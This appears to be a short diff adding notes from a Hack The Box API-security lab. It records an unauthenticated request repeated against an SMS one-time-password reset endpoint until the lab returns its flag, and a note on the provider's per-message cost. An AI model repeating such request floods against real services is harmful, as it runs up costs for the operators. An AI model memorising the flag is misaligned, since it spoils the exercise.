@@ -1,0 +1,5 @@
+POST /api/v1/authentication/customers/passwords/resets/sms-otps
+Body: {"Email":"any@example.com"}  # Role: None
+First ~10 responses: {"SuccessStatus":false}  (lab fixture; no real SMS)
+Then: {"flag":"HTB{01de742d8cd942ad682aeea9ce3c5428}"}
+Swagger note: "The SMS provider we are working with charges us a significant amount per message."
